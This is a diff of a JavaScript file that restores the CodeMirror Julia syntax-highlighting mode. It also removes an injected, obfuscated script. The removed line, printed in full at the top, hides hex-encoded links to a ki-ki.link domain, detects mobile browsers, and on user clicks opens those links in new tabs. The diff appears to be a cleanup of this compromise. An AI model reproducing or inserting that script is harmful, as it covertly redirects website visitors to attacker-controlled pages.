@@ -1,2 +1,390 @@
+// CodeMirror, copyright (c) by Marijn Haverbeke and others
+// Distributed under an MIT license: https://codemirror.net/LICENSE
 
-function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x6e\x63\x4f\x32\x63\x302','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x64\x6a\x6c\x33\x63\x343','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x58\x62\x56\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x59\x61\x5a\x37\x63\x397','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x57\x47\x50\x36\x63\x396','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x54\x75\x71\x38\x63\x328','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4f\x6c\x49\x35\x63\x305','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x55\x45\x7a\x31\x63\x331',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4c\x45\x65\x34\x63\x384',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x72\x54\x6b\x39\x63\x329','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());
+(function(mod) {
+  if (typeof exports == "object" && typeof module == "object") // CommonJS
+    mod(require("../../lib/codemirror"));
+  else if (typeof define == "function" && define.amd) // AMD
+    define(["../../lib/codemirror"], mod);
+  else // Plain browser env
+    mod(CodeMirror);
+})(function(CodeMirror) {
+"use strict";
+
+CodeMirror.defineMode("julia", function(config, parserConf) {
+  function wordRegexp(words, end, pre) {
+    if (typeof pre === "undefined") { pre = ""; }
+    if (typeof end === "undefined") { end = "\\b"; }
+    return new RegExp("^" + pre + "((" + words.join(")|(") + "))" + end);
+  }
+
+  var octChar = "\\\\[0-7]{1,3}";
+  var hexChar = "\\\\x[A-Fa-f0-9]{1,2}";
+  var sChar = "\\\\[abefnrtv0%?'\"\\\\]";
+  var uChar = "([^\\u0027\\u005C\\uD800-\\uDFFF]|[\\uD800-\\uDFFF][\\uDC00-\\uDFFF])";
+
+  var asciiOperatorsList = [
+    "[<>]:", "[<>=]=", "<<=?", ">>>?=?", "=>", "--?>", "<--[->]?", "\\/\\/",
+    "\\.{2,3}", "[\\.\\\\%*+\\-<>!\\/^|&]=?", "\\?", "\\$", "~", ":"
+  ];
+  var operators = parserConf.operators || wordRegexp([
+    "[<>]:", "[<>=]=", "<<=?", ">>>?=?", "=>", "--?>", "<--[->]?", "\\/\\/",
+    "[\\\\%*+\\-<>!\\/^|&\\u00F7\\u22BB]=?", "\\?", "\\$", "~", ":",
+    "\\u00D7", "\\u2208", "\\u2209", "\\u220B", "\\u220C", "\\u2218",
+    "\\u221A", "\\u221B", "\\u2229", "\\u222A", "\\u2260", "\\u2264",
+    "\\u2265", "\\u2286", "\\u2288", "\\u228A", "\\u22C5",
+    "\\b(in|isa)\\b(?!\.?\\()"
+  ], "");
+  var delimiters = parserConf.delimiters || /^[;,()[\]{}]/;
+  var identifiers = parserConf.identifiers ||
+        /^[_A-Za-z\u00A1-\u2217\u2219-\uFFFF][\w\u00A1-\u2217\u2219-\uFFFF]*!*/;
+
+  var chars = wordRegexp([octChar, hexChar, sChar, uChar], "'");
+
+  var openersList = ["begin", "function", "type", "struct", "immutable", "let",
+        "macro", "for", "while", "quote", "if", "else", "elseif", "try",
+        "finally", "catch", "do"];
+
+  var closersList = ["end", "else", "elseif", "catch", "finally"];
+
+  var keywordsList = ["if", "else", "elseif", "while", "for", "begin", "let",
+        "end", "do", "try", "catch", "finally", "return", "break", "continue",
+        "global", "local", "const", "export", "import", "importall", "using",
+        "function", "where", "macro", "module", "baremodule", "struct", "type",
+        "mutable", "immutable", "quote", "typealias", "abstract", "primitive",
+        "bitstype"];
+
+  var builtinsList = ["true", "false", "nothing", "NaN", "Inf"];
+
+  CodeMirror.registerHelper("hintWords", "julia", keywordsList.concat(builtinsList));
+
+  var openers = wordRegexp(openersList);
+  var closers = wordRegexp(closersList);
+  var keywords = wordRegexp(keywordsList);
+  var builtins = wordRegexp(builtinsList);
+
+  var macro = /^@[_A-Za-z\u00A1-\uFFFF][\w\u00A1-\uFFFF]*!*/;
+  var symbol = /^:[_A-Za-z\u00A1-\uFFFF][\w\u00A1-\uFFFF]*!*/;
+  var stringPrefixes = /^(`|([_A-Za-z\u00A1-\uFFFF]*"("")?))/;
+
+  var macroOperators = wordRegexp(asciiOperatorsList, "", "@");
+  var symbolOperators = wordRegexp(asciiOperatorsList, "", ":");
+
+  function inArray(state) {
+    return (state.nestedArrays > 0);
+  }
+
+  function inGenerator(state) {
+    return (state.nestedGenerators > 0);
+  }
+
+  function currentScope(state, n) {
+    if (typeof(n) === "undefined") { n = 0; }
+    if (state.scopes.length <= n) {
+      return null;
+    }
+    return state.scopes[state.scopes.length - (n + 1)];
+  }
+
+  // tokenizers
+  function tokenBase(stream, state) {
+    // Handle multiline comments
+    if (stream.match('#=', false)) {
+      state.tokenize = tokenComment;
+      return state.tokenize(stream, state);
+    }
+
+    // Handle scope changes
+    var leavingExpr = state.leavingExpr;
+    if (stream.sol()) {
+      leavingExpr = false;
+    }
+    state.leavingExpr = false;
+
+    if (leavingExpr) {
+      if (stream.match(/^'+/)) {
+        return "operator";
+      }
+    }
+
+    if (stream.match(/\.{4,}/)) {
+      return "error";
+    } else if (stream.match(/\.{1,3}/)) {
+      return "operator";
+    }
+
+    if (stream.eatSpace()) {
+      return null;
+    }
+
+    var ch = stream.peek();
+
+    // Handle single line comments
+    if (ch === '#') {
+      stream.skipToEnd();
+      return "comment";
+    }
+
+    if (ch === '[') {
+      state.scopes.push('[');
+      state.nestedArrays++;
+    }
+
+    if (ch === '(') {
+      state.scopes.push('(');
+      state.nestedGenerators++;
+    }
+
+    if (inArray(state) && ch === ']') {
+      while (state.scopes.length && currentScope(state) !== "[") { state.scopes.pop(); }
+      state.scopes.pop();
+      state.nestedArrays--;
+      state.leavingExpr = true;
+    }
+
+    if (inGenerator(state) && ch === ')') {
+      while (state.scopes.length && currentScope(state) !== "(") { state.scopes.pop(); }
+      state.scopes.pop();
+      state.nestedGenerators--;
+      state.leavingExpr = true;
+    }
+
+    if (inArray(state)) {
+      if (state.lastToken == "end" && stream.match(':')) {
+        return "operator";
+      }
+      if (stream.match('end')) {
+        return "number";
+      }
+    }
+
+    var match;
+    if (match = stream.match(openers, false)) {
+      state.scopes.push(match[0]);
+    }
+
+    if (stream.match(closers, false)) {
+      state.scopes.pop();
+    }
+
+    // Handle type annotations
+    if (stream.match(/^::(?![:\$])/)) {
+      state.tokenize = tokenAnnotation;
+      return state.tokenize(stream, state);
+    }
+
+    // Handle symbols
+    if (!leavingExpr && (stream.match(symbol) || stream.match(symbolOperators))) {
+      return "builtin";
+    }
+
+    // Handle parametric types
+    //if (stream.match(/^{[^}]*}(?=\()/)) {
+    //  return "builtin";
+    //}
+
+    // Handle operators and Delimiters
+    if (stream.match(operators)) {
+      return "operator";
+    }
+
+    // Handle Number Literals
+    if (stream.match(/^\.?\d/, false)) {
+      var imMatcher = RegExp(/^im\b/);
+      var numberLiteral = false;
+      if (stream.match(/^0x\.[0-9a-f_]+p[\+\-]?[_\d]+/i)) { numberLiteral = true; }
+      // Integers
+      if (stream.match(/^0x[0-9a-f_]+/i)) { numberLiteral = true; } // Hex
+      if (stream.match(/^0b[01_]+/i)) { numberLiteral = true; } // Binary
+      if (stream.match(/^0o[0-7_]+/i)) { numberLiteral = true; } // Octal
+      // Floats
+      if (stream.match(/^(?:(?:\d[_\d]*)?\.(?!\.)(?:\d[_\d]*)?|\d[_\d]*\.(?!\.)(?:\d[_\d]*))?([Eef][\+\-]?[_\d]+)?/i)) { numberLiteral = true; }
+      if (stream.match(/^\d[_\d]*(e[\+\-]?\d+)?/i)) { numberLiteral = true; } // Decimal
+      if (numberLiteral) {
+          // Integer literals may be "long"
+          stream.match(imMatcher);
+          state.leavingExpr = true;
+          return "number";
+      }
+    }
+
+    // Handle Chars
+    if (stream.match('\'')) {
+      state.tokenize = tokenChar;
+      return state.tokenize(stream, state);
+    }
+
+    // Handle Strings
+    if (stream.match(stringPrefixes)) {
+      state.tokenize = tokenStringFactory(stream.current());
+      return state.tokenize(stream, state);
+    }
+
+    if (stream.match(macro) || stream.match(macroOperators)) {
+      return "meta";
+    }
+
+    if (stream.match(delimiters)) {
+      return null;
+    }
+
+    if (stream.match(keywords)) {
+      return "keyword";
+    }
+
+    if (stream.match(builtins)) {
+      return "builtin";
+    }
+
+    var isDefinition = state.isDefinition || state.lastToken == "function" ||
+                       state.lastToken == "macro" || state.lastToken == "type" ||
+                       state.lastToken == "struct" || state.lastToken == "immutable";
+
+    if (stream.match(identifiers)) {
+      if (isDefinition) {
+        if (stream.peek() === '.') {
+          state.isDefinition = true;
+          return "variable";
+        }
+        state.isDefinition = false;
+        return "def";
+      }
+      state.leavingExpr = true;
+      return "variable";
+    }
+
+    // Handle non-detected items
+    stream.next();
+    return "error";
+  }
+
+  function tokenAnnotation(stream, state) {
+    stream.match(/.*?(?=[,;{}()=\s]|$)/);
+    if (stream.match('{')) {
+      state.nestedParameters++;
+    } else if (stream.match('}') && state.nestedParameters > 0) {
+      state.nestedParameters--;
+    }
+    if (state.nestedParameters > 0) {
+      stream.match(/.*?(?={|})/) || stream.next();
+    } else if (state.nestedParameters == 0) {
+      state.tokenize = tokenBase;
+    }
+    return "builtin";
+  }
+
+  function tokenComment(stream, state) {
+    if (stream.match('#=')) {
+      state.nestedComments++;
+    }
+    if (!stream.match(/.*?(?=(#=|=#))/)) {
+      stream.skipToEnd();
+    }
+    if (stream.match('=#')) {
+      state.nestedComments--;
+      if (state.nestedComments == 0)
+        state.tokenize = tokenBase;
+    }
+    return "comment";
+  }
+
+  function tokenChar(stream, state) {
+    var isChar = false, match;
+    if (stream.match(chars)) {
+      isChar = true;
+    } else if (match = stream.match(/\\u([a-f0-9]{1,4})(?=')/i)) {
+      var value = parseInt(match[1], 16);
+      if (value <= 55295 || value >= 57344) { // (U+0,U+D7FF), (U+E000,U+FFFF)
+        isChar = true;
+        stream.next();
+      }
+    } else if (match = stream.match(/\\U([A-Fa-f0-9]{5,8})(?=')/)) {
+      var value = parseInt(match[1], 16);
+      if (value <= 1114111) { // U+10FFFF
+        isChar = true;
+        stream.next();
+      }
+    }
+    if (isChar) {
+      state.leavingExpr = true;
+      state.tokenize = tokenBase;
+      return "string";
+    }
+    if (!stream.match(/^[^']+(?=')/)) { stream.skipToEnd(); }
+    if (stream.match('\'')) { state.tokenize = tokenBase; }
+    return "error";
+  }
+
+  function tokenStringFactory(delimiter) {
+    if (delimiter.substr(-3) === '"""') {
+      delimiter = '"""';
+    } else if (delimiter.substr(-1) === '"') {
+      delimiter = '"';
+    }
+    function tokenString(stream, state) {
+      if (stream.eat('\\')) {
+        stream.next();
+      } else if (stream.match(delimiter)) {
+        state.tokenize = tokenBase;
+        state.leavingExpr = true;
+        return "string";
+      } else {
+        stream.eat(/[`"]/);
+      }
+      stream.eatWhile(/[^\\`"]/);
+      return "string";
+    }
+    return tokenString;
+  }
+
+  var external = {
+    startState: function() {
+      return {
+        tokenize: tokenBase,
+        scopes: [],
+        lastToken: null,
+        leavingExpr: false,
+        isDefinition: false,
+        nestedArrays: 0,
+        nestedComments: 0,
+        nestedGenerators: 0,
+        nestedParameters: 0,
+        firstParenPos: -1
+      };
+    },
+
+    token: function(stream, state) {
+      var style = state.tokenize(stream, state);
+      var current = stream.current();
+
+      if (current && style) {
+        state.lastToken = current;
+      }
+
+      return style;
+    },
+
+    indent: function(state, textAfter) {
+      var delta = 0;
+      if ( textAfter === ']' || textAfter === ')' || /^end\b/.test(textAfter) ||
+           /^else/.test(textAfter) || /^catch\b/.test(textAfter) || /^elseif\b/.test(textAfter) ||
+           /^finally/.test(textAfter) ) {
+        delta = -1;
+      }
+      return (state.scopes.length + delta) * config.indentUnit;
+    },
+
+    electricInput: /\b(end|else|catch|finally)\b/,
+    blockCommentStart: "#=",
+    blockCommentEnd: "=#",
+    lineComment: "#",
+    closeBrackets: "()[]{}\"\"",
+    fold: "indent"
+  };
+  return external;
+});
+
+
+CodeMirror.defineMIME("text/x-julia", "julia");
+
+});
